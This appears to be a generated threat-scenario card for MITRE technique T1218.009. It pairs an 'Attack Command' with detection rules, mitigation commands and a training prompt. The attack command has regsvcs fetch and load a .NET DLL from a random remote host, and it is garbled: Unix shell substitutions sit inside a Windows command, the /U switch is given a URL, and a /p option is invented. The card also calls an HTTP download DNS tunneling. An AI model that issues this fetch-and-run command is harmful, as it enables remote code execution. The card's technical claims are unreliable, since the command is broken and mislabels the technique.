---
type: campaign
scenario_id: 404
tactic: Defense Evasion
technique: "T1218.009: Regsvcs/Regasm"
technique_id: T1218.009
tags: [campaign, lotl, defense_evasion]
---

# Using regsvcs to execute DNS tunneling .NET assembly.

## Threat Description
Using regsvcs to execute DNS tunneling .NET assembly.

## Attack Command
```
regsvcs /U http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor regsvcs HTTP: `wmic process where name='regsvcs.exe' get commandline | findstr http`; YARA rule: `rule RegsvcsDnsTunnel { strings: $a = /regsvcs.*http/ nocase; condition: $a }`.

## Mitigation
Restrict regsvcs: `icacls %windir%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /deny Everyone:RX`; Block .NET downloads: `netsh advfirewall firewall add rule name='Block regsvcs' dir=out program='%windir%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe' action=block`.

## AI Training Prompt
Train AI to detect regsvcs-based DNS tunneling .NET execution by analyzing HTTP downloads, regsvcs command-line arguments, and DNS query patterns; suggest .NET download restrictions.

## References
- MITRE ATT&CK T1218.009: https://attack.mitre.org/techniques/T1218/009/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
